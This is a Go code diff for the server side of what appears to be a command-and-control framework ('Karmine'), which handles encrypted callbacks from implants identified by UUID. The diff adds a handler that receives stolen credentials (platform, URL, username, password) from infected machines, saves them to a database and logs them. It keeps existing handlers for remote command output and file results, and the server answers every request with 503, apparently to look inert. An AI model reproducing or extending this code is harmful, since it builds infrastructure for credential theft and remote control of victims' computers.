@@ -9,6 +9,7 @@ import (
 	"net"
 	"net/http"
 	"os"
+	"strings"
 
 	"github.com/alecthomas/kingpin"
 	"github.com/gorilla/mux"
@@ -57,6 +58,11 @@ func main() {
 		log.Error(err)
 	}
 	r := mux.NewRouter()
+	c, err := config.GetFullConfig()
+	if err != nil {
+		log.Fatal(err)
+	}
+	r.Host(c.SslDomain)
 	r.HandleFunc(conf.Endpoint, simpleHandler)
 	srv.Handler = r
 	srv.Addr = *host + ":" + *port
@@ -65,7 +71,7 @@ func main() {
 	if err != nil {
 		log.Fatal(err)
 	}
-	db, err = datastore.New("karmine")
+	db, err = datastore.New()
 	if err != nil {
 		log.Fatal(err)
 	}
@@ -114,7 +120,6 @@ func handleGet(w http.ResponseWriter, r *http.Request) {
 	}
 	bytes, err := os.ReadFile(contentFile)
 	if err != nil {
-		log.Error(err)
 		w.WriteHeader(503)
 		return
 	}
@@ -130,23 +135,22 @@ func handlePost(w http.ResponseWriter, r *http.Request) {
 		w.WriteHeader(503)
 		return
 	}
+	var obj []byte
+	var err error
+	if len(genericData.UUID) != 0 {
+		aeskey, x1, x2 := db.GetKeysByUUID(r.Header.Get("X-UUID"))
+		obj, err = kes.DecryptObject(genericData.Object, aeskey, x1, x2)
+		if err != nil {
+			log.Error(err)
+			w.WriteHeader(503)
+			return
+		}
+	} else {
+		obj = genericData.Object
+	}
 	switch genericData.Type {
 	case 1:
-		var obj []byte
-		var err error
-		if len(genericData.UUID) != 0 {
-			aeskey, x1, x2 := db.GetKeysByUUID(r.Header.Get("X-UUID"))
-			obj, err = kes.DecryptObject(genericData.Object, aeskey, x1, x2)
-			if err != nil {
-				log.Error(err)
-				w.WriteHeader(503)
-				return
-			}
-		} else {
-			obj = genericData.Object
-		}
 		cmdResponse := &models.KarResponseObjectCmd{}
-
 		if err := json.Unmarshal(obj, &cmdResponse); err != nil {
 			log.Error(err)
 			w.WriteHeader(503)
@@ -170,21 +174,7 @@ func handlePost(w http.ResponseWriter, r *http.Request) {
 				return
 			}
 		}
-		w.WriteHeader(503)
 	case 2:
-		var obj []byte
-		var err error
-		if len(genericData.UUID) != 0 {
-			aeskey, x1, x2 := db.GetKeysByUUID(r.Header.Get("X-UUID"))
-			obj, err = kes.DecryptObject(genericData.Object, aeskey, x1, x2)
-			if err != nil {
-				log.Error(err)
-				w.WriteHeader(503)
-				return
-			}
-		} else {
-			obj = genericData.Object
-		}
 		fileObj := &models.KarResponseObjectFile{}
 		if err := json.Unmarshal(obj, fileObj); err != nil {
 			log.Error(err)
@@ -196,25 +186,57 @@ func handlePost(w http.ResponseWriter, r *http.Request) {
 			if err != nil {
 				log.Error(err)
 			}
-			fmt.Printf("%% %s %% %s ---\n", n, r.RemoteAddr)
+			s := fmt.Sprintf("\n%s | %s\n", n, r.RemoteAddr)
+			brk := strings.Repeat("-", len(s))
+			fmt.Println("\n" + brk)
+			fmt.Println(s)
 			log.WithField("status", "error").Error(fileObj.ErrVal)
+			fmt.Println(brk)
+
 		}
-		w.WriteHeader(503)
+	case 3:
+		pwObj := &models.KarObjectCred{}
+		if err = json.Unmarshal(obj, pwObj); err != nil {
+			log.Error(err)
+			w.WriteHeader(503)
+			return
+		}
+		n, err := datastore.GetNameByUUID(r.Header.Get("X-UUID"))
+		if err != nil {
+			log.Error(err)
+		}
+		if err = db.InsertCreds(r.Header.Get("X-UUID"), pwObj.Platform, pwObj.Creds.Url, pwObj.Creds.Username, pwObj.Creds.Password); err != nil {
+			log.Error(err)
+			w.WriteHeader(503)
+			return
+		}
+		s := fmt.Sprintf("\n%s | %s\n", n, r.RemoteAddr)
+		brk := strings.Repeat("-", len(s))
+		fmt.Println("\n" + brk)
+		fmt.Println(s)
+		log.WithField("status", "success").Infof("received and logged credentials from %s", r.RemoteAddr)
+		fmt.Println(brk)
+
 	}
+	w.WriteHeader(503)
 }
 
 func logResponse(resp *models.KarResponseObjectCmd, cmd, name, uid, addr string) {
 	if len(cmd) == 0 {
 		return
 	}
-	fmt.Printf("%% %s %% %s---\n", name, addr)
+	s := fmt.Sprintf("\n%s | %s\n", name, addr)
+	brk := strings.Repeat("-", len(s))
+	fmt.Println("\n" + brk)
+	fmt.Println(s)
 	log.WithField("status", "success").Info(cmd)
 	if len(resp.Data.Error) != 0 {
 		log.WithField("status", "error").Info(resp.Data.Error)
 		return
 	}
-	log.Info(resp.Data.Result)
-	fmt.Println("---")
+	fmt.Printf("\n%s\n", resp.Data.Result)
+	fmt.Println(brk)
+
 }
 
 func newMTLSServer(certFile string) (*http.Server, error) {
